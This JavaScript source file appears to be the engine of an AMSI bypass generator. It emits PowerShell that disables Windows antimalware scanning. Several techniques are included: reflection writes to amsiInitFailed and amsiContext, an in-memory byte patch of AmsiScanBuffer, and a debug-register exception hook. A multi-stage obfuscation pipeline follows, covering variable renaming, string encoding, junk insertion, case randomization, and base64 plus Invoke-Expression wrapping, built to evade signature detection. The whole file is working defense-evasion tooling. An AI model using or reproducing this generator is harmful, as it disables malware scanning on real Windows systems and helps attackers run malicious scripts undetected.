// js/amsi-engine.js — AMSI.fail obfuscation engine

'use strict';

// ============================================================
// Utilities
// ============================================================

function randomInt(max) {
  return Math.floor(Math.random() * max);
}

function randomRange(min, max) {
  return min + randomInt(max - min);
}

function randomCase(input) {
  return input.split('').map(c =>
    Math.round(Math.random()) ? c.toUpperCase() : c.toLowerCase()
  ).join('');
}

function randomString(length) {
  const first = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_';
  const rest = first + '0123456789';
  let ret = first[randomInt(first.length)];
  for (let i = 1; i < length; i++) {
    ret += rest[randomInt(rest.length)];
  }
  return ret;
}

function randomVarName() {
  return randomString(randomRange(4, 14));
}

function chunkSubstr(str, size) {
  const numChunks = Math.ceil(str.length / size);
  const chunks = new Array(numChunks);
  for (let i = 0, o = 0; i < numChunks; ++i, o += size) {
    chunks[i] = str.substr(o, size);
  }
  return chunks;
}

function toBinary(string) {
  const codeUnits = new Uint16Array(string.length);
  for (let i = 0; i < codeUnits.length; i++) {
    codeUnits[i] = string.charCodeAt(i);
  }
  return btoa(String.fromCharCode(...new Uint8Array(codeUnits.buffer)));
}

function pickRandom(arr) {
  return arr[randomInt(arr.length)];
}

// PS automatic variables that must NEVER be renamed
const PS_AUTOVARS = new Set([
  '$null', '$true', '$false', '$_', '$PSItem', '$this',
  '$args', '$input', '$PSCmdlet', '$PSScriptRoot',
  '$MyInvocation', '$ExecutionContext', '$Host',
  '$Error', '$Event', '$EventArgs', '$EventSubscriber',
  '$ForEach', '$Matches', '$PSBoundParameters',
  '$PSDebugContext', '$PSVersionTable', '$Sender',
  '$StackTrace', '$switch'
]);

// ============================================================
// PSPayload factory
// ============================================================

// Shared parser helper: skips here-strings, quoted strings, tracks depth
// Calls onChar(c, i, context) for each char outside strings/here-strings
// context = { inHereString, inString, depth }
function parsePS(raw, onChar) {
  let inHereString = false;
  let inString = false;
  let stringChar = '';
  let depth = 0;
  for (let i = 0; i < raw.length; i++) {
    const c = raw[i];
    // Here-string detection: @" opens, "@ at start-of-line closes
    if (inHereString) {
      if (c === '"' && raw[i - 1] === '\n' && raw[i + 1] === '@') {
        i += 1; // skip the @
        inHereString = false;
      }
      continue;
    }
    if (c === '@' && raw[i + 1] === '"' && (i === 0 || raw[i - 1] === '=' || raw[i - 1] === ' ')) {
      inHereString = true;
      i += 1; // skip the "
      continue;
    }
    if (inString) {
      if (c === stringChar && raw[i - 1] !== '`') inString = false;
      continue;
    }
    if (c === '"' || c === "'") { inString = true; stringChar = c; continue; }
    if (c === '{' || c === '(') { depth++; }
    if (c === '}' || c === ')') { depth--; }
    onChar(c, i, { depth, inHereString, inString });
  }
}

// Detect here-string regions in raw PS, returns array of {start, end} (inclusive)
function findHereStringRegions(raw) {
  const regions = [];
  let start = -1;
  for (let i = 0; i < raw.length; i++) {
    if (start === -1) {
      if (raw[i] === '@' && raw[i + 1] === '"' && (i === 0 || raw[i - 1] === '=' || raw[i - 1] === ' ')) {
        start = i;
        i += 1;
      }
    } else {
      if (raw[i] === '"' && raw[i - 1] === '\n' && raw[i + 1] === '@') {
        regions.push({ start, end: i + 1 });
        start = -1;
        i += 1;
      }
    }
  }
  return regions;
}

function isInsideHereString(pos, regions) {
  return regions.some(r => pos >= r.start && pos <= r.end);
}

function createPayload({ raw, technique, variables = [], sensitiveStrings = [], statements = null }) {
  if (statements === null) {
    statements = [];
    parsePS(raw, (c, i, ctx) => {
      if ((c === ';' || c === '\n') && ctx.depth === 0) {
        statements.push(i);
      }
    });
  }
  return { raw, technique, variables, sensitiveStrings, statements };
}

// ============================================================
// Technique Registry
// ============================================================

const TechniqueRegistry = {
  _techniques: {},

  register(technique) {
    this._techniques[technique.name] = technique;
  },

  get(name) {
    const t = this._techniques[name];
    if (!t) throw new Error(`Unknown technique: ${name}`);
    return t;
  },

  getRandom() {
    const keys = Object.keys(this._techniques);
    return this._techniques[keys[randomInt(keys.length)]];
  },

  list() {
    return Object.keys(this._techniques);
  }
};

// ============================================================
// Shared: Assembly enumeration helper (avoids [Ref].Assembly)
// ============================================================

// Generates PS code that finds SMA assembly and resolves the AmsiUtils type
// via [AppDomain] enumeration instead of [Ref].Assembly.GetType()
function genAsmLookup(vAsm, vType, vBf) {
  return (
    `$${vAsm}=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.Location -and $_.Location.EndsWith('System.Management.Automation.dll')};` +
    `$${vBf}=[System.Reflection.BindingFlags]'NonPublic,Static';` +
    `$${vType}=$${vAsm}.GetTypes()|Where-Object{$_.Name -eq 'AmsiUtils'};`
  );
}

// Generates PS code that resolves native functions from System.dll internals
// (avoids Add-Type + csc.exe entirely)
function genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) {
  return (
    `$${vSysDll}=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{$_.Location -and $_.Location.EndsWith('System.dll')};` +
    `$${vUnsafe}=$${vSysDll}.GetType('Microsoft.Win32.UnsafeNativeMethods');` +
    `$${vLoadLib}=$${vUnsafe}.GetMethod('LoadLibrary',[Type[]]@([String]));` +
    `$${vGetProc}=$${vUnsafe}.GetMethod('GetProcAddress',[Type[]]@([IntPtr],[String]));`
  );
}

// ============================================================
// Techniques (rewritten — no [Ref].Assembly, no Add-Type)
// ============================================================

TechniqueRegistry.register({
  name: 'ForceError',
  description: 'Allocate memory, overwrite amsiContext via assembly enumeration',
  generate() {
    const vAsm = randomVarName();
    const vType = randomVarName();
    const vBf = randomVarName();
    const vMem = randomVarName();
    const raw =
      genAsmLookup(vAsm, vType, vBf) +
      `$${vMem}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);` +
      `$${vType}.GetField('amsiSession',$${vBf}).SetValue($null,$null);` +
      `$${vType}.GetField('amsiContext',$${vBf}).SetValue($null,[IntPtr]$${vMem})`;
    return createPayload({
      raw,
      technique: 'ForceError',
      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vMem}`],
      sensitiveStrings: ['AmsiUtils', 'amsiSession', 'amsiContext']
    });
  }
});

TechniqueRegistry.register({
  name: 'MattGRefl',
  description: 'Set amsiInitFailed=true via assembly enumeration',
  generate() {
    const vAsm = randomVarName();
    const vType = randomVarName();
    const vBf = randomVarName();
    const vField = randomVarName();
    const raw =
      genAsmLookup(vAsm, vType, vBf) +
      `$${vField}=$${vType}.GetField('amsiInitFailed',$${vBf});` +
      `$${vField}.SetValue($null,$true)`;
    return createPayload({
      raw,
      technique: 'MattGRefl',
      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vField}`],
      sensitiveStrings: ['AmsiUtils', 'amsiInitFailed']
    });
  }
});

TechniqueRegistry.register({
  name: 'MattGReflLog',
  description: 'Delegate-based field access to bypass WMF5 logging',
  generate() {
    const vAsm = randomVarName();
    const vType = randomVarName();
    const vBf = randomVarName();
    const vDel = randomVarName();
    const vField = randomVarName();
    // Uses Delegate::CreateDelegate to invoke GetField indirectly,
    // avoiding direct reflection calls that WMF5 logs
    const raw =
      genAsmLookup(vAsm, vType, vBf) +
      `$${vDel}=[Delegate]::CreateDelegate([Func[String,[Reflection.BindingFlags],[Reflection.FieldInfo]]],[Object]$${vType},'GetField');` +
      `$${vField}=$${vDel}.Invoke('amsiInitFailed',$${vBf});` +
      `$${vField}.SetValue($null,$true)`;
    return createPayload({
      raw,
      technique: 'MattGReflLog',
      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vDel}`, `$${vField}`],
      sensitiveStrings: ['AmsiUtils', 'amsiInitFailed']
    });
  }
});

TechniqueRegistry.register({
  name: 'MattGRef02',
  description: 'Overwrite amsiContext integer via assembly enumeration',
  generate() {
    const vAsm = randomVarName();
    const vType = randomVarName();
    const vBf = randomVarName();
    const vCtx = randomVarName();
    const hexVal = '0x' + randomInt(2147483647).toString(16);
    const raw =
      genAsmLookup(vAsm, vType, vBf) +
      `$${vCtx}=$${vType}.GetField('amsiContext',$${vBf}).GetValue($null);` +
      `[System.Runtime.InteropServices.Marshal]::WriteInt32($${vCtx},${hexVal})`;
    return createPayload({
      raw,
      technique: 'MattGRef02',
      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vCtx}`],
      sensitiveStrings: ['AmsiUtils', 'amsiContext']
    });
  }
});

TechniqueRegistry.register({
  name: 'RastaBuf',
  description: 'Patch AmsiScanBuffer via UnsafeNativeMethods (no Add-Type)',
  generate() {
    const vSysDll = randomVarName();
    const vUnsafe = randomVarName();
    const vLoadLib = randomVarName();
    const vGetProc = randomVarName();
    const vLib = randomVarName();
    const vAddr = randomVarName();
    const vOld = randomVarName();
    const vPatch = randomVarName();
    const vK32 = randomVarName();
    const vVpAddr = randomVarName();
    const vVpDel = randomVarName();
    const vRef = randomVarName();

    // VirtualProtect is NOT on UnsafeNativeMethods — resolve it via GetProcAddress from kernel32
    // Build delegate type via MakeGenericType to avoid [Func[...[UInt32].MakeByRefType()...]]
    // inline syntax which breaks under case randomization
    const raw =
      genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) +
      `$${vLib}=$${vLoadLib}.Invoke($null,@('amsi.dll'));` +
      `$${vAddr}=$${vGetProc}.Invoke($null,@($${vLib},'AmsiScanBuffer'));` +
      `$${vK32}=$${vLoadLib}.Invoke($null,@('kernel32.dll'));` +
      `$${vVpAddr}=$${vGetProc}.Invoke($null,@($${vK32},'VirtualProtect'));` +
      `$${vRef}=[UInt32].MakeByRefType();` +
      `$${vVpDel}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($${vVpAddr},([type]'System.Func\`5').MakeGenericType([IntPtr],[UInt32],[UInt32],$${vRef},[Bool]));` +
      `$${vOld}=[uint32]0;` +
      `$${vVpDel}.Invoke($${vAddr},6,0x40,[ref]$${vOld});` +
      `$${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);` +
      `[System.Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vAddr},6)`;

    return createPayload({
      raw,
      technique: 'RastaBuf',
      variables: [
        `$${vSysDll}`, `$${vUnsafe}`, `$${vLoadLib}`, `$${vGetProc}`,
        `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`,
        `$${vK32}`, `$${vVpAddr}`, `$${vVpDel}`, `$${vRef}`
      ],
      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods', 'kernel32.dll']
    });
  }
});

TechniqueRegistry.register({
  name: 'FieldOffset',
  description: 'Marshal::Copy to amsiContext field offset via assembly enumeration',
  generate() {
    const vAsm = randomVarName();
    const vType = randomVarName();
    const vBf = randomVarName();
    const vCtx = randomVarName();
    const vPatch = randomVarName();
    const raw =
      genAsmLookup(vAsm, vType, vBf) +
      `$${vCtx}=$${vType}.GetField('amsiContext',$${vBf}).GetValue($null);` +
      `$${vPatch}=[System.BitConverter]::GetBytes([System.Int32]::MaxValue);` +
      `[System.Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vCtx},4)`;
    return createPayload({
      raw,
      technique: 'FieldOffset',
      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vCtx}`, `$${vPatch}`],
      sensitiveStrings: ['AmsiUtils', 'amsiContext']
    });
  }
});

TechniqueRegistry.register({
  name: 'ScanBufferPatchAlt',
  description: 'Patch AmsiScanBuffer via UnsafeNativeMethods + delegate (no csc.exe)',
  generate() {
    const vSysDll = randomVarName();
    const vUnsafe = randomVarName();
    const vLoadLib = randomVarName();
    const vGetProc = randomVarName();
    const vLib = randomVarName();
    const vAddr = randomVarName();
    const vOld = randomVarName();
    const vPatch = randomVarName();
    const vK32 = randomVarName();
    const vVpAddr = randomVarName();
    const vVpDel = randomVarName();
    const vRef = randomVarName();

    // VirtualProtect resolved via GetProcAddress from kernel32, not UnsafeNativeMethods
    // Build delegate type via MakeGenericType to avoid [Func[...[UInt32].MakeByRefType()...]]
    // inline syntax which breaks under case randomization
    const raw =
      genNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) +
      `$${vLib}=$${vLoadLib}.Invoke($null,@('amsi.dll'));` +
      `$${vAddr}=$${vGetProc}.Invoke($null,@($${vLib},'AmsiScanBuffer'));` +
      `$${vK32}=$${vLoadLib}.Invoke($null,@('kernel32.dll'));` +
      `$${vVpAddr}=$${vGetProc}.Invoke($null,@($${vK32},'VirtualProtect'));` +
      `$${vRef}=[UInt32].MakeByRefType();` +
      `$${vVpDel}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($${vVpAddr},([type]'System.Func\`5').MakeGenericType([IntPtr],[UInt32],[UInt32],$${vRef},[Bool]));` +
      `$${vOld}=[uint32]0;` +
      `$${vVpDel}.Invoke($${vAddr},6,0x40,[ref]$${vOld});` +
      `$${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);` +
      `[System.Runtime.InteropServices.Marshal]::Copy($${vPatch},0,$${vAddr},6)`;

    return createPayload({
      raw,
      technique: 'ScanBufferPatchAlt',
      variables: [
        `$${vSysDll}`, `$${vUnsafe}`, `$${vLoadLib}`, `$${vGetProc}`,
        `$${vLib}`, `$${vAddr}`, `$${vOld}`, `$${vPatch}`,
        `$${vK32}`, `$${vVpAddr}`, `$${vVpDel}`, `$${vRef}`
      ],
      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll', 'VirtualProtect', 'UnsafeNativeMethods', 'kernel32.dll']
    });
  }
});

TechniqueRegistry.register({
  name: 'ReflectionFromAssembly',
  description: 'Enumerate assemblies + types to find AMSI dynamically',
  generate() {
    const vAsm = randomVarName();
    const vType = randomVarName();
    const vBf = randomVarName();
    const vField = randomVarName();
    const raw =
      genAsmLookup(vAsm, vType, vBf) +
      `$${vField}=$${vType}.GetField('amsiInitFailed',$${vBf});` +
      `$${vField}.SetValue($null,$true)`;
    return createPayload({
      raw,
      technique: 'ReflectionFromAssembly',
      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`, `$${vField}`],
      sensitiveStrings: ['AmsiUtils', 'amsiInitFailed']
    });
  }
});

TechniqueRegistry.register({
  name: 'BlankAmsiProviders',
  description: 'Zero out amsiContext + null amsiSession via assembly enumeration',
  generate() {
    const vAsm = randomVarName();
    const vType = randomVarName();
    const vBf = randomVarName();
    const raw =
      genAsmLookup(vAsm, vType, vBf) +
      `$${vType}.GetField('amsiContext',$${vBf}).SetValue($null,[IntPtr]::Zero);` +
      `$${vType}.GetField('amsiSession',$${vBf}).SetValue($null,$null)`;
    return createPayload({
      raw,
      technique: 'BlankAmsiProviders',
      variables: [`$${vAsm}`, `$${vType}`, `$${vBf}`],
      sensitiveStrings: ['AmsiUtils', 'amsiContext', 'amsiSession']
    });
  }
});

TechniqueRegistry.register({
  name: 'HardwareBreakpoint',
  description: 'VEH + debug registers on AmsiScanBuffer (no memory patching)',
  generate() {
    const vType = randomVarName();
    const vLib = randomVarName();
    const vAddr = randomVarName();
    const vHandler = randomVarName();
    const className = randomVarName();

    const raw =
`$${vType} = @"
using System;
using System.Runtime.InteropServices;
public class ${className} {
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr GetCurrentThread();
    [DllImport("kernel32")]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [DllImport("kernel32")]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT ctx);
    [DllImport("kernel32")]
    public static extern IntPtr AddVectoredExceptionHandler(uint first, IntPtr handler);
    public delegate long VEH(IntPtr pExceptionInfo);
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT {
        public long P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs;
        public uint EFlags;
        public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
        public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
        public ulong R8, R9, R10, R11, R12, R13, R14, R15;
        public ulong Rip;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1232)]
        public byte[] ExtRegs;
    }
    private static IntPtr _target;
    public static void SetTarget(IntPtr addr) { _target = addr; }
    public static long Handler(IntPtr pInfo) {
        var rec = Marshal.ReadIntPtr(pInfo);
        var code = (uint)Marshal.ReadInt32(rec);
        var ctx = Marshal.ReadIntPtr(pInfo, IntPtr.Size);
        if (code == 0x80000004) {
            var rip = Marshal.ReadInt64(ctx, 0xF8);
            if ((ulong)rip == (ulong)_target) {
                Marshal.WriteInt64(ctx, 0x78, 0x80070057);
                var dr7 = Marshal.ReadInt64(ctx, 0x70);
                Marshal.WriteInt64(ctx, 0x70, dr7 & ~(long)1);
            }
        }
        return 0;
    }
}
"@
Add-Type $${vType}
$${vLib} = [${className}]::LoadLibrary('amsi.dll')
$${vAddr} = [${className}]::GetProcAddress($${vLib}, 'AmsiScanBuffer')
[${className}]::SetTarget($${vAddr})
$${vHandler} = [${className}+VEH]::new([${className}], 'Handler')
[${className}]::AddVectoredExceptionHandler(1, [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate($${vHandler}))
$ctx = New-Object ${className}+CONTEXT
$ctx.ContextFlags = 0x100010
$thread = [${className}]::GetCurrentThread()
[${className}]::GetThreadContext($thread, [ref]$ctx)
$ctx.Dr0 = [uint64]$${vAddr}
$ctx.Dr7 = $ctx.Dr7 -bor 1
[${className}]::SetThreadContext($thread, [ref]$ctx)`;

    return createPayload({
      raw,
      technique: 'HardwareBreakpoint',
      variables: [`$${vType}`, `$${vLib}`, `$${vAddr}`, `$${vHandler}`, '$ctx', '$thread'],
      sensitiveStrings: ['AmsiScanBuffer', 'amsi.dll']
    });
  }
});

// ============================================================
// String Encoding Methods
// ============================================================

function obfuscateInt(int) {
  if (int <= 0) return `(${int})`;
  if (int === 1) return pickRandom(['(1)', '(2-1)', '(3-2)']);
  if (int === 2) return pickRandom(['(2)', '(1+1)', '(4-2)']);

  const subNumber = randomInt(int - 2) + 1;
  switch (randomInt(6)) {
    case 0: return `(${subNumber}+${int - subNumber})`;
    case 1: return `(${int}+${subNumber}-${subNumber})`;
    case 2: return `(${int}*${subNumber}/${subNumber})`;
    case 3: return `(${int})`;
    case 4: {
      const mask = randomInt(65536);
      return `(0x${((int ^ mask) >>> 0).toString(16)} -bxor 0x${mask.toString(16)})`;
    }
    case 5: {
      const log2 = Math.log2(int);
      if (Number.isInteger(log2)) return `(1 -shl ${log2})`;
      return `(${subNumber}+${int - subNumber})`;
    }
  }
  return `(${int})`;
}

function charEncodeAsChar(char) {
  return `[${randomCase('char')}]${obfuscateInt(char.charCodeAt(0))}`;
}

function charEncodeAsByte(char) {
  return `([${randomCase('byte')}]0x${char.charCodeAt(0).toString(16)})`;
}

function encodeStringChars(str) {
  const parts = str.split('').map(c =>
    Math.round(Math.random()) ? charEncodeAsChar(c) : charEncodeAsByte(c)
  );
  // Cast first element to [string] so PS treats + as string concatenation, not integer addition
  if (parts.length > 1) parts[0] = '[string]' + parts[0];
  return parts.join('+');
}

const DIACRITIC_MAP = {
  65: [192, 197],   // A
  97: [224, 229],   // a
  69: [200, 203],   // E
  101: [232, 235],  // e
  73: [204, 207],   // I
  105: [236, 239],  // i
  79: [210, 216],   // O
  111: [243, 246],  // o
  85: [217, 220],   // U
  117: [249, 252],  // u
};

function getRandomDiacritic(charCode) {
  const range = DIACRITIC_MAP[charCode];
  if (range) return String.fromCharCode(range[0] + randomInt(range[1] - range[0]));
  return String.fromCharCode(charCode);
}

function encodeStringDiacritic(str) {
  const diacriticStr = str.split('').map(c => getRandomDiacritic(c.charCodeAt(0))).join('');
  const chunkSize = randomRange(2, Math.max(3, diacriticStr.length));
  const chunks = chunkSubstr(diacriticStr, chunkSize);
  const joined = chunks.join("'+'");

  const formD = encodeStringChars('FormD');
  const pattern = encodeStringChars(String.raw`\p{Mn}`);

  return `('${joined}').${randomCase('Normalize')}(${formD}) -replace ${pattern}`;
}

function encodeStringFormat(str) {
  if (str.length < 2 || str.includes("'")) return encodeStringChars(str);
  const numSplits = randomRange(1, Math.min(4, str.length));
  const points = new Set();
  while (points.size < numSplits) {
    points.add(randomRange(1, str.length));
  }
  const sorted = [...points].sort((a, b) => a - b);

  let format = '';
  const args = [];
  let prev = 0;
  sorted.forEach((pt, i) => {
    args.push(str.slice(prev, pt));
    format += `{${i}}`;
    prev = pt;
  });
  args.push(str.slice(prev));
  format += `{${sorted.length}}`;

  const argsStr = args.map(a => `'${a}'`).join(',');
  return `('${format}' -f ${argsStr})`;
}

function encodeStringBytes(str) {
  const bytes = str.split('').map(c => obfuscateInt(c.charCodeAt(0)));
  return `([${randomCase('System.Text.Encoding')}]::ASCII.GetString([byte[]](${bytes.join(',')})))`;
}

function encodeStringReverse(str) {
  // If string contains single quotes, fall back to char encoding
  if (str.includes("'")) return encodeStringChars(str);
  const reversed = str.split('').reverse().join('');
  const len = str.length;
  return `('${reversed}'[${obfuscateInt(len - 1)}..0] -join '')`;
}

function obfuscateString(str) {
  const methods = [
    encodeStringChars,
    encodeStringDiacritic,
    encodeStringFormat,
    encodeStringBytes,
    encodeStringReverse,
  ];
  return pickRandom(methods)(str);
}

// ============================================================
// Obfuscation Pipeline
// ============================================================

const ObfuscationPipeline = {
  stages: [],

  addStage(stage) {
    this.stages.push(stage);
  },

  run(payload) {
    for (const stage of this.stages) {
      payload = stage.process(payload);
    }
    return payload;
  }
};

// --- Stage 1: Variable Renaming ---
ObfuscationPipeline.addStage({
  name: 'variableRenaming',
  process(payload) {
    let { raw, variables } = payload;
    const newVars = [];

    for (const v of variables) {
      if (PS_AUTOVARS.has(v)) { newVars.push(v); continue; }
      const newName = '$' + randomVarName();
      newVars.push(newName);
      const bare = v.slice(1);
      const newBare = newName.slice(1);
      // Replace $var references outside here-strings
      const hereRegions = findHereStringRegions(raw);
      const varPattern = new RegExp('\\$' + bare.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + '\\b', 'g');
      let match;
      const replacements = [];
      while ((match = varPattern.exec(raw)) !== null) {
        if (!isInsideHereString(match.index, hereRegions)) {
          replacements.push({ start: match.index, end: match.index + match[0].length });
        }
      }
      for (let i = replacements.length - 1; i >= 0; i--) {
        const r = replacements[i];
        raw = raw.slice(0, r.start) + '$' + newBare + raw.slice(r.end);
      }
      // Also replace bare class name references (e.g., [ClassName]::) outside here-strings
      const hereRegions2 = findHereStringRegions(raw);
      const barePattern = new RegExp(`(?<!\\$)\\b${bare.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\b`, 'g');
      const replacements2 = [];
      while ((match = barePattern.exec(raw)) !== null) {
        if (!isInsideHereString(match.index, hereRegions2)) {
          replacements2.push({ start: match.index, end: match.index + match[0].length });
        }
      }
      for (let i = replacements2.length - 1; i >= 0; i--) {
        const r = replacements2[i];
        raw = raw.slice(0, r.start) + newBare + raw.slice(r.end);
      }
    }

    return { ...payload, raw, variables: newVars };
  }
});

// --- Stage 2: Sensitive String Obfuscation ---
ObfuscationPipeline.addStage({
  name: 'sensitiveStringObfuscation',
  process(payload) {
    let { raw, sensitiveStrings } = payload;

    for (const word of sensitiveStrings) {
      const obf = obfuscateString(word);
      // Replace exactly-quoted occurrences: 'word' → $(obf)
      raw = raw.split(`'${word}'`).join(`$(${obf})`);

      // For bare occurrences, only replace those inside single-quoted strings
      // (i.e., word is a substring of a larger 'string.with.Word.in.it')
      // Do NOT replace bare code references like ::MethodName( or .TypeName
      const escaped = word.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      const re = new RegExp(escaped, 'g');
      let match;
      const replacements = [];
      const hereRegions = findHereStringRegions(raw);
      while ((match = re.exec(raw)) !== null) {
        if (isInsideHereString(match.index, hereRegions)) continue;
        // Check if this occurrence is inside a single-quoted string
        const before = raw.slice(0, match.index);
        const after = raw.slice(match.index + word.length);
        // Count unescaped single quotes before this position
        const quotesBefore = (before.match(/'/g) || []).length;
        // Odd number of quotes = we're inside a quoted string
        if (quotesBefore % 2 === 1) {
          replacements.push({ start: match.index, end: match.index + word.length });
        }
      }
      // Apply replacements in reverse order to preserve positions
      for (let i = replacements.length - 1; i >= 0; i--) {
        const r = replacements[i];
        raw = raw.slice(0, r.start) + `'+$(${obf})+'` + raw.slice(r.end);
      }
    }

    raw = raw.replace(/''\+'/g, "'");
    raw = raw.replace(/'\+''/g, "'");
    raw = raw.replace(/^''\+/g, '');
    raw = raw.replace(/\+''$/g, '');

    return { ...payload, raw };
  }
});

// --- Stage 3: Integer Obfuscation ---
ObfuscationPipeline.addStage({
  name: 'integerObfuscation',
  process(payload) {
    let { raw } = payload;
    const hereRegions = findHereStringRegions(raw);

    raw = raw.replace(/(?<=[\(,\s])(\d{2,})(?=[\),;\s\]])/g, (match, _p1, offset) => {
      // Do NOT obfuscate integers inside here-strings (C# code requires literal ints)
      if (isInsideHereString(offset, hereRegions)) return match;
      const val = parseInt(match, 10);
      if (val <= 0) return match;
      return obfuscateInt(val);
    });

    return { ...payload, raw };
  }
});

// --- Stage 4: Junk Insertion ---
ObfuscationPipeline.addStage({
  name: 'junkInsertion',
  process(payload) {
    let { raw } = payload;

    const hereRegions = findHereStringRegions(raw);
    const boundaries = [];
    parsePS(raw, (c, i, ctx) => {
      if (c === ';' && ctx.depth === 0 && !isInsideHereString(i, hereRegions)) {
        boundaries.push(i);
      }
    });

    if (boundaries.length < 2) return { ...payload, raw };

    const numInserts = randomRange(2, Math.min(5, boundaries.length + 1));
    const chosen = [];
    const available = [...boundaries];
    for (let i = 0; i < numInserts && available.length > 0; i++) {
      const idx = randomInt(available.length);
      chosen.push(available.splice(idx, 1)[0]);
    }
    chosen.sort((a, b) => b - a);

    for (const pos of chosen) {
      const junkType = randomInt(3);
      let junk;
      switch (junkType) {
        case 0: {
          const jVar = randomVarName();
          const jVal = randomString(randomRange(5, 20));
          junk = `$${jVar}='${jVal}'`;
          break;
        }
        case 1: {
          junk = `[${randomCase('System.Threading.Thread')}]::Sleep(${randomInt(500)})`;
          break;
        }
        case 2: {
          const nopVar = randomString(randomRange(3, 10));
          junk = `[void](${randomCase('Get-Variable')} -Name '${nopVar}' -ErrorAction SilentlyContinue)`;
          break;
        }
      }
      raw = raw.slice(0, pos + 1) + junk + ';' + raw.slice(pos + 1);
    }

    return { ...payload, raw };
  }
});

// --- Stage 5: Case Randomization ---
ObfuscationPipeline.addStage({
  name: 'caseRandomization',
  process(payload) {
    let { raw } = payload;

    const hereRegions = findHereStringRegions(raw);
    let result = '';
    let inStr = false;
    let strChar = '';
    let inHereString = false;

    for (let i = 0; i < raw.length; i++) {
      const c = raw[i];
      // Track here-strings: content is C# code, must not randomize case
      if (inHereString) {
        result += c;
        if (c === '"' && raw[i - 1] === '\n' && raw[i + 1] === '@') {
          result += '@';
          i += 1;
          inHereString = false;
        }
        continue;
      }
      if (c === '@' && raw[i + 1] === '"' && (i === 0 || raw[i - 1] === '=' || raw[i - 1] === ' ')) {
        inHereString = true;
        result += c;
        continue;
      }
      if (inStr) {
        result += c;
        if (c === strChar && raw[i - 1] !== '`') inStr = false;
        continue;
      }
      if (c === '"' || c === "'") {
        inStr = true;
        strChar = c;
        result += c;
        continue;
      }
      if (/[a-zA-Z]/.test(c)) {
        result += Math.round(Math.random()) ? c.toUpperCase() : c.toLowerCase();
      } else {
        result += c;
      }
    }

    return { ...payload, raw: result };
  }
});

// --- Stage 6: Expression Wrapping ---
ObfuscationPipeline.addStage({
  name: 'expressionWrapping',
  process(payload) {
    let { raw } = payload;
    const hasHereString = findHereStringRegions(raw).length > 0;

    // IEX wrapping (case 1) escapes " to `" which destroys here-string
    // delimiters @" and "@ — skip IEX for techniques with here-strings
    const choices = hasHereString ? [0, 2] : [0, 1, 2];
    switch (pickRandom(choices)) {
      case 0:
        raw = `& {${raw}}`;
        break;
      case 1: {
        const v = randomVarName();
        const escaped = raw.replace(/\$/g, '`$').replace(/"/g, '`"');
        raw = `$${v}="${escaped}";${randomCase('Invoke-Expression')} $${v}`;
        break;
      }
      case 2:
        break;
    }

    return { ...payload, raw };
  }
});

// ============================================================
// Public API
// ============================================================

function generate(techniqueName = null) {
  const technique = techniqueName
    ? TechniqueRegistry.get(techniqueName)
    : TechniqueRegistry.getRandom();

  let payload = technique.generate();
  payload = ObfuscationPipeline.run(payload);
  const stubComment = `# Stub: ${technique.name}\n`;
  return stubComment + payload.raw;
}

function generateEncoded(techniqueName = null) {
  const inner = generate(techniqueName);
  const encoded = toBinary(inner);
  const decoder = randomCase('[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(');
  return `${decoder}"${encoded}"))|${randomCase('iex')}`;
}

function listTechniques() {
  return TechniqueRegistry.list();
}